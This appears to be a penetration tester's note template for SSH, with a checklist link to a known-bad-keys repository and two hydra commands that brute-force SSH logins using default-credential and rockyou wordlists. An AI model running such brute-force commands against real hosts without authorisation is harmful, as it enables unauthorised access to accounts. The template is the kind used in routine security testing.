<% tp.file.rename("1_SSH_")%>

- [ ] Bad keys? (https://github.com/rapid7/ssh-badkeys)

## Bruteforce default credentials
```bash
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt ssh://$hip -V -t 4 -I -s $hport
```

Or for a given user:
```bash
hydra -l $user -P /usr/share/wordlists/rockyou.txt ssh://$hip$ -V -t 4 -I -s 22
```


# Findings